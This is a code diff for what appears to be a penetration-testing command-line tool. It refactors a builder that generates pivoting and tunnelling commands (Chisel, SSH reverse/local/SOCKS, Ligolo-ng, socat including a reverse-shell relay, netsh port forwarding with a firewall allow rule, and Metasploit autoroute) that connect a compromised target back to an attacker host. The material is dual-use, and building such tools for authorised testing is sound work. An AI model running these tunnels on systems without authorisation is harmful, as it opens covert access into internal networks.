@@ -19,6 +19,200 @@ from empusa.cli_common import (
 )
 from empusa.cli_scan import validate_hostname, validate_port
 
+# ---------------------------------------------------------------------------
+# Pure command builders (no I/O, no prompts). These are the testable units.
+# Each returns the canonical (label, command) list for one tunnel type.
+# Interactive ``build_reverse_tunnel`` collects parameters via Prompt and
+# delegates here. Keeping these pure makes the rendered command set
+# directly assertable from tests.
+# ---------------------------------------------------------------------------
+
+# Tunnel type registry: choice -> (display name, builder name).
+TUNNEL_TYPES: dict[str, str] = {
+    "1": "Chisel",
+    "2": "SSH_Reverse",
+    "3": "SSH_Local",
+    "4": "SSH_SOCKS",
+    "5": "Ligolo",
+    "6": "Socat",
+    "7": "Netsh",
+    "8": "Metasploit",
+}
+
+
+def _require(*values: str) -> None:
+    """Raise ``ValueError`` if any value is empty/None.
+
+    Used by the pure builders so missing inputs surface a deterministic
+    error rather than producing a command string with empty fields.
+    """
+    for v in values:
+        if v is None or v == "":
+            raise ValueError("missing required tunnel parameter")
+
+
+def build_chisel_commands(attacker_ip: str, chisel_port: str, socks_port: str) -> list[tuple[str, str]]:
+    _require(attacker_ip, chisel_port, socks_port)
+    return [
+        ("Attacker", f"./chisel server -p {chisel_port} --socks5 --reverse"),
+        ("Target", f"./chisel client {attacker_ip}:{chisel_port} R:{socks_port}:socks"),
+        ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
+        ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
+    ]
+
+
+def build_ssh_reverse_commands(
+    attacker_user: str,
+    attacker_host: str,
+    remote_port: str,
+    local_port: str,
+    target_host: str = "127.0.0.1",
+) -> list[tuple[str, str]]:
+    _require(attacker_user, attacker_host, remote_port, local_port, target_host)
+    return [
+        ("Target", f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -f"),
+        (
+            "Alternative (no background)",
+            f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host}",
+        ),
+        ("Access", f"# Connect to localhost:{remote_port} on attacker machine"),
+        (
+            "Keep Alive",
+            f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} "
+            f"-N -o ServerAliveInterval=60 -o ServerAliveCountMax=3",
+        ),
+    ]
+
+
+def build_ssh_local_commands(
+    attacker_user: str,
+    pivot_host: str,
+    local_port: str,
+    target_host: str,
+    target_port: str,
+) -> list[tuple[str, str]]:
+    _require(attacker_user, pivot_host, local_port, target_host, target_port)
+    return [
+        ("Attacker", f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host} -N -f"),
+        (
+            "Alternative (no background)",
+            f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host}",
+        ),
+        ("Access", f"# Connect to localhost:{local_port} on your machine"),
+        (
+            "Multiple Ports",
+            f"ssh -L {local_port}:{target_host}:{target_port} -L 8081:target2:443 {attacker_user}@{pivot_host} -N",
+        ),
+    ]
+
+
+def build_ssh_socks_commands(attacker_user: str, pivot_host: str, socks_port: str) -> list[tuple[str, str]]:
+    _require(attacker_user, pivot_host, socks_port)
+    return [
+        ("Attacker", f"ssh -D {socks_port} {attacker_user}@{pivot_host} -N -f"),
+        ("Alternative (no background)", f"ssh -D {socks_port} {attacker_user}@{pivot_host}"),
+        ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
+        ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
+        ("Usage Example", "proxychains nmap -sT -Pn 10.10.10.0/24"),
+    ]
+
+
+def build_ligolo_commands(attacker_ip: str, ligolo_port: str, tunnel_ip: str) -> list[tuple[str, str]]:
+    _require(attacker_ip, ligolo_port, tunnel_ip)
+    return [
+        ("Attacker - Setup Interface", "sudo ip tuntap add user $(whoami) mode tun ligolo"),
+        ("Attacker - Bring Up", "sudo ip link set ligolo up"),
+        ("Attacker - Start Proxy", f"./proxy -selfcert -laddr 0.0.0.0:{ligolo_port}"),
+        ("Target", f"./agent -connect {attacker_ip}:{ligolo_port} -ignore-cert"),
+        ("In Ligolo Console", "session # Select session"),
+        ("In Ligolo Console", "ifconfig # View target networks"),
+        ("Attacker - Add Route", f"sudo ip route add {tunnel_ip} dev ligolo"),
+        ("In Ligolo Console", "start # Start tunnel"),
+    ]
+
+
+def build_socat_commands(listen_port: str, target_host: str, target_port: str) -> list[tuple[str, str]]:
+    _require(listen_port, target_host, target_port)
+    return [
+        ("Basic Forward", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port}"),
+        ("Background", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port} &"),
+        ("With Reuseaddr", f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}"),
+        ("Reverse Shell Relay", f"socat TCP-LISTEN:{listen_port} TCP:{target_host}:{target_port}"),
+        ("Usage", f"# Connect to localhost:{listen_port} to reach {target_host}:{target_port}"),
+    ]
+
+
+def build_netsh_commands(
+    listen_port: str,
+    target_host: str,
+    target_port: str,
+    listen_addr: str = "0.0.0.0",
+) -> list[tuple[str, str]]:
+    _require(listen_port, target_host, target_port, listen_addr)
+    return [
+        (
+            "Add Port Forward",
+            f"netsh interface portproxy add v4tov4 listenaddress={listen_addr} "
+            f"listenport={listen_port} connectaddress={target_host} connectport={target_port}",
+        ),
+        ("List Forwards", "netsh interface portproxy show all"),
+        (
+            "Delete Forward",
+            f"netsh interface portproxy delete v4tov4 listenaddress={listen_addr} listenport={listen_port}",
+        ),
+        ("Reset All", "netsh interface portproxy reset"),
+        (
+            "Firewall Rule",
+            f'netsh advfirewall firewall add rule name="Port Forward {listen_port}" '
+            f"protocol=TCP dir=in localport={listen_port} action=allow",
+        ),
+        ("Note", "# Requires Administrator privileges"),
+    ]
+
+
+def build_metasploit_commands(
+    session_id: str,
+    target_subnet: str,
+    local_port: str,
+    target_host: str = "",
+    target_port: str = "",
+) -> list[tuple[str, str]]:
+    _require(session_id, target_subnet, local_port)
+    cmds: list[tuple[str, str]] = [
+        ("Autoroute", "use post/multi/manage/autoroute"),
+        ("Set Session", f"set SESSION {session_id}"),
+        ("Set Subnet", f"set SUBNET {target_subnet}"),
+        ("Run", "run"),
+        ("Verify Routes", "route print"),
+        ("SOCKS Proxy", "use auxiliary/server/socks_proxy"),
+        ("Set Version", "set SRVPORT 1080"),
+        ("Run Proxy", "run -j"),
+    ]
+    if target_host and target_port:
+        cmds.extend(
+            [
+                ("Port Forward", f"portfwd add -l {local_port} -p {target_port} -r {target_host}"),
+                ("List Forwards", "portfwd list"),
+                ("Delete Forward", f"portfwd delete -l {local_port}"),
+            ]
+        )
+    return cmds
+
+
+def format_commands_file(tunnel_name: str, env_name: str, commands: list[tuple[str, str]]) -> str:
+    """Render the on-disk command file body (no I/O)."""
+    out: list[str] = [
+        f"# {tunnel_name} Tunnel Commands",
+        f"# Generated: {datetime.now().isoformat()}",
+        f"# Environment: {env_name}",
+        "",
+    ]
+    for label, cmd in commands:
+        out.append(f"# {label}")
+        out.append(cmd)
+        out.append("")
+    return "\n".join(out) + "\n"
+
 
 def build_reverse_tunnel() -> None:
     """Interactive builder for reverse tunnels and port forwarding with multiple tools."""
@@ -62,12 +256,7 @@ def build_reverse_tunnel() -> None:
             log_error("Invalid port number")
             return
 
-        commands = [
-            ("Attacker", f"./chisel server -p {chisel_port} --socks5 --reverse"),
-            ("Target", f"./chisel client {attacker_ip}:{chisel_port} R:{socks_port}:socks"),
-            ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
-            ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
-        ]
+        commands = build_chisel_commands(attacker_ip, chisel_port, socks_port)
 
     elif choice == "2":
         # SSH Reverse Tunnel
@@ -93,18 +282,7 @@ def build_reverse_tunnel() -> None:
 
         target_host = Prompt.ask("Enter target host", default="127.0.0.1")
 
-        commands = [
-            ("Target", f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -f"),
-            (
-                "Alternative (no background)",
-                f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host}",
-            ),
-            ("Access", f"# Connect to localhost:{remote_port} on attacker machine"),
-            (
-                "Keep Alive",
-                f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -o ServerAliveInterval=60 -o ServerAliveCountMax=3",
-            ),
-        ]
+        commands = build_ssh_reverse_commands(attacker_user, attacker_host, remote_port, local_port, target_host)
 
     elif choice == "3":
         # SSH Local Tunnel
@@ -129,18 +307,7 @@ def build_reverse_tunnel() -> None:
             log_error("Invalid port number")
             return
 
-        commands = [
-            ("Attacker", f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host} -N -f"),
-            (
-                "Alternative (no background)",
-                f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host}",
-            ),
-            ("Access", f"# Connect to localhost:{local_port} on your machine"),
-            (
-                "Multiple Ports",
-                f"ssh -L {local_port}:{target_host}:{target_port} -L 8081:target2:443 {attacker_user}@{pivot_host} -N",
-            ),
-        ]
+        commands = build_ssh_local_commands(attacker_user, pivot_host, local_port, target_host, target_port)
 
     elif choice == "4":
         # SSH Dynamic SOCKS
@@ -159,13 +326,7 @@ def build_reverse_tunnel() -> None:
             log_error("Invalid port number")
             return
 
-        commands = [
-            ("Attacker", f"ssh -D {socks_port} {attacker_user}@{pivot_host} -N -f"),
-            ("Alternative (no background)", f"ssh -D {socks_port} {attacker_user}@{pivot_host}"),
-            ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
-            ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
-            ("Usage Example", "proxychains nmap -sT -Pn 10.10.10.0/24"),
-        ]
+        commands = build_ssh_socks_commands(attacker_user, pivot_host, socks_port)
 
     elif choice == "5":
         # Ligolo-ng
@@ -185,16 +346,7 @@ def build_reverse_tunnel() -> None:
 
         tunnel_ip = Prompt.ask("Enter tunnel network (e.g., 240.0.0.1/24)", default="240.0.0.1/24")
 
-        commands = [
-            ("Attacker - Setup Interface", "sudo ip tuntap add user $(whoami) mode tun ligolo"),
-            ("Attacker - Bring Up", "sudo ip link set ligolo up"),
-            ("Attacker - Start Proxy", f"./proxy -selfcert -laddr 0.0.0.0:{ligolo_port}"),
-            ("Target", f"./agent -connect {attacker_ip}:{ligolo_port} -ignore-cert"),
-            ("In Ligolo Console", "session # Select session"),
-            ("In Ligolo Console", "ifconfig # View target networks"),
-            ("Attacker - Add Route", f"sudo ip route add {tunnel_ip} dev ligolo"),
-            ("In Ligolo Console", "start # Start tunnel"),
-        ]
+        commands = build_ligolo_commands(attacker_ip, ligolo_port, tunnel_ip)
 
     elif choice == "6":
         # Socat
@@ -216,13 +368,7 @@ def build_reverse_tunnel() -> None:
             log_error("Invalid port number")
             return
 
-        commands = [
-            ("Basic Forward", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port}"),
-            ("Background", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port} &"),
-            ("With Reuseaddr", f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}"),
-            ("Reverse Shell Relay", f"socat TCP-LISTEN:{listen_port} TCP:{target_host}:{target_port}"),
-            ("Usage", f"# Connect to localhost:{listen_port} to reach {target_host}:{target_port}"),
-        ]
+        commands = build_socat_commands(listen_port, target_host, target_port)
 
     elif choice == "7":
         # Windows Netsh
@@ -243,23 +389,7 @@ def build_reverse_tunnel() -> None:
 
         listen_addr = Prompt.ask("Enter listen address", default="0.0.0.0")
 
-        commands = [
-            (
-                "Add Port Forward",
-                f"netsh interface portproxy add v4tov4 listenaddress={listen_addr} listenport={listen_port} connectaddress={target_host} connectport={target_port}",
-            ),
-            ("List Forwards", "netsh interface portproxy show all"),
-            (
-                "Delete Forward",
-                f"netsh interface portproxy delete v4tov4 listenaddress={listen_addr} listenport={listen_port}",
-            ),
-            ("Reset All", "netsh interface portproxy reset"),
-            (
-                "Firewall Rule",
-                f'netsh advfirewall firewall add rule name="Port Forward {listen_port}" protocol=TCP dir=in localport={listen_port} action=allow',
-            ),
-            ("Note", "# Requires Administrator privileges"),
-        ]
+        commands = build_netsh_commands(listen_port, target_host, target_port, listen_addr)
 
     elif choice == "8":
         # Metasploit Autoroute
@@ -276,25 +406,7 @@ def build_reverse_tunnel() -> None:
         target_host = Prompt.ask("Enter target host for port forward (optional)", default="")
         target_port = Prompt.ask("Enter target port for port forward (optional)", default="")
 
-        commands = [
-            ("Autoroute", "use post/multi/manage/autoroute"),
-            ("Set Session", f"set SESSION {session_id}"),
-            ("Set Subnet", f"set SUBNET {target_subnet}"),
-            ("Run", "run"),
-            ("Verify Routes", "route print"),
-            ("SOCKS Proxy", "use auxiliary/server/socks_proxy"),
-            ("Set Version", "set SRVPORT 1080"),
-            ("Run Proxy", "run -j"),
-        ]
-
-        if target_host and target_port:
-            commands.extend(
-                [
-                    ("Port Forward", f"portfwd add -l {local_port} -p {target_port} -r {target_host}"),
-                    ("List Forwards", "portfwd list"),
-                    ("Delete Forward", f"portfwd delete -l {local_port}"),
-                ]
-            )
+        commands = build_metasploit_commands(session_id, target_subnet, local_port, target_host, target_port)
 
     # Display commands
     render_group_heading(f"{tunnel_name} Commands", "bold green")
